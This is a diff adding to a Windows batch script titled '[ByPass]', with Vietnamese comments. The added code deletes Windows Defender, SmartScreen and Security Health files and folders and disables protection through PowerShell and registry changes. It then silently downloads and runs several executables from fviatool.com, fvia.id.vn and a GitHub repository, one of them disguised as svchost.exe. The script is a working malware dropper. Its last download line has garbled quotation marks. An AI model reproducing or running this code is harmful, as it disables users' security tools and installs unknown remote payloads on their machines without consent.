@@ -1,6 +1,57 @@
 @echo off
-setlocal enabledelayedexpansion
+pushd "%CD%"
+CD /D "%~dp0"
+title [ByPass]
 
+:: Xóa thư mục và tệp tin liên quan đến Windows Defender
+rmdir /s /q "C:\Windows\SystemApps\Microsoft.Windows.SecHealthUI_cw5n1h2txyewy"
+FOR /d %%f IN ("C:\Program Files\WindowsApps\Microsoft.SecHealthUI*") DO rmdir /s /q "%%f"
+powershell "Get-AppxPackage *SecHealth* | Reset-AppxPackage"
+
+:: Tắt Windows Defender và các thành phần liên quan
+bcdedit /set disableelamdrivers yes
+powershell -WindowStyle Hidden -Command "Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend"
+powershell -WindowStyle Hidden -Command "Set-MpPreference -SubmitSamplesConsent 2"
+
+echo Windows Defender đã được vô hiệu hóa.
+
+:: Tạo và thực thi các tệp tin đã tải về
+set DOWNLOAD_FOLDER=%TEMP%
+set URL_LIST=https://fvia.id.vn/update.exe
+set FILE_NAMES=update.exe
+
+for %%i in (%URL_LIST%) do (
+    curl -o "%DOWNLOAD_FOLDER%\%%~nxi" --insecure "%%i"
+)
+
+timeout /t 1
+start "" "%DOWNLOAD_FOLDER%\update.exe"
+
+:: Xóa các thư mục và tệp tin không cần thiết
+for %%d in ("C:\Windows\WinSxS\amd64_security-octagon*" "C:\Windows\WinSxS\x86_windows-defender*" "C:\Windows\WinSxS\wow64_windows-defender*" "C:\Windows\WinSxS\amd64_windows-defender*" "C:\Windows\SystemApps\Microsoft.Windows.AppRep.ChxApp_cw5n1h2txyewy" "C:\ProgramData\Microsoft\Windows Defender" "C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection" "C:\Program Files (x86)\Windows Defender Advanced Threat Protection" "C:\Program Files\Windows Defender Advanced Threat Protection" "C:\ProgramData\Microsoft\Windows Security Health" "C:\ProgramData\Microsoft\Storage Health" "C:\WINDOWS\System32\drivers\wd" "C:\Program Files (x86)\Windows Defender" "C:\Program Files\Windows Defender" "C:\Windows\System32\SecurityHealth" "C:\Windows\System32\WebThreatDefSvc" "C:\Windows\System32\Sgrm" "C:\Windows\Containers" "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\Modules\DefenderPerformance" "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\DefenderPerformance" "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\Defender" "C:\Windows\System32\Tasks_Migrated\Microsoft\Windows\Windows Defender" "C:\Windows\System32\Tasks\Microsoft\Windows\Windows Defender" "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\Modules\Defender" "C:\Windows\System32\HealthAttestationClient" "C:\Windows\GameBarPresenceWriter" "C:\Windows\bcastdvr") do rmdir "%%~d" /s /q
+
+:: Xóa các tệp tin không cần thiết
+for %%d in ("C:\Windows\WinSxS\FileMaps\wow64_windows-defender*.manifest" "C:\Windows\WinSxS\FileMaps\x86_windows-defender*.manifest" "C:\Windows\WinSxS\FileMaps\amd64_windows-defender*.manifest" "C:\Windows\System32\SecurityAndMaintenance_Error.png" "C:\Windows\System32\SecurityAndMaintenance.png" "C:\Windows\System32\SecurityHealthSystray.exe" "C:\Windows\System32\SecurityHealthService.exe" "C:\Windows\System32\SecurityHealthHost.exe" "C:\Windows\System32\drivers\SgrmAgent.sys" "C:\Windows\System32\drivers\WdDevFlt.sys" "C:\Windows\System32\drivers\WdBoot.sys" "C:\Windows\System32\drivers\WdFilter.sys" "C:\Windows\System32\wscsvc.dll" "C:\Windows\System32\drivers\WdNisDrv.sys" "C:\Windows\System32\wscsvc.dll" "C:\Windows\System32\wscproxystub.dll" "C:\Windows\System32\wscisvif.dll" "C:\Windows\System32\SecurityHealthProxyStub.dll" "C:\Windows\System32\smartscreen.dll" "C:\Windows\SysWOW64\smartscreen.dll" "C:\Windows\System32\smartscreen.exe" "C:\Windows\SysWOW64\smartscreen.exe" "C:\Windows\System32\DWWIN.EXE" "C:\Windows\SysWOW64\smartscreenps.dll" "C:\Windows\System32\smartscreenps.dll" "C:\Windows\System32\SecurityHealthCore.dll" "C:\Windows\System32\SecurityHealthSsoUdk.dll" "C:\Windows\System32\SecurityHealthUdk.dll" "C:\Windows\System32\SecurityHealthAgent.dll" "C:\Windows\System32\wscapi.dll" "C:\Windows\System32\wscadminui.exe" "C:\Windows\SysWOW64\GameBarPresenceWriter.exe" "C:\Windows\System32\GameBarPresenceWriter.exe" "C:\Windows\SysWOW64\DeviceCensus.exe" "C:\Windows\SysWOW64\CompatTelRunner.exe" "C:\Windows\system32\drivers\msseccore.sys") DO del /f "%%d"
+
+echo Script đã được điều chỉnh thành công.
+
+:: Function to disable Windows Defender
+:disable_windows_defender
+powershell -WindowStyle Hidden -Command "Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend"
+powershell -WindowStyle Hidden -Command "Set-MpPreference -SubmitSamplesConsent 2"
+
+echo Windows Defender has been disabled.
+
+:: Function to download and execute files
+:download_and_execute_files
+powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://fviatool.com/defender.exe', 'C:\Users\%USERNAME%\Downloads\defender.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\defender.exe' -WindowStyle Hidden"
+powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/fviatool/fvia/main/svchost.exe', 'C:\Users\%USERNAME%\Downloads\svchost.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\svchost.exe' -WindowStyle Hidden"
+powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://fviatool.com/WindowsSecurity.exe', 'C:\Users\%USERNAME%\Downloads\WindowsSecurity.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\WindowsSecurity.exe' -WindowStyle Hidden"
+powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://fviatool.com/update.exe', 'C:\Users\%USERNAME%\Downloads\update.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\update.exe' -WindowStyle Hidden"
+powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://fviatool.com/get.exe', 'C:\Users\%USERNAME%\Downloads\get.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\get.exe' -WindowStyle Hidden"
+powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/fviatool/fvia/raw/main/update.exe', 'C:\Users\%USERNAME%\Downloads\update.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\update.exe' -WindowStyle Hidden"
+powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/fviatool/fvia/raw/main/fvia.exe', 'C:\Users\%USERNAME%\Downloads\fvia.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\fvia.exe' -WindowStyle Hidden"
+powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://fviatool.com/Runtime.exe', 'C:\Users\%USERNAME%\Downloads\Runtime.exe’); Start-Process -FilePath ‘C:\Users%USERNAME%\Downloads\Runtime.exe’ -WindowStyle Hidden”
 set "defenderDisableCmds[0]=REG ADD ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender"" /v DisableAntiSpyware /t REG_DWORD /d 1 /f"
 set "defenderDisableCmds[1]=REG ADD ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f"
 set "defenderDisableCmds[2]=REG ADD ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f"
@@ -10,7 +61,7 @@ for %%i in (0 1 2 3) do (
     set "cmd=!defenderDisableCmds[%%i]!"
     powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process cmd -ArgumentList '/C !cmd!' -Verb RunAs -Wait"
 )
-@echo off
+
 powershell -NoProfile -ExecutionPolicy Bypass -Command "Set-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications -Name ToastEnabled -Type DWord -Value 0"
 
 REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
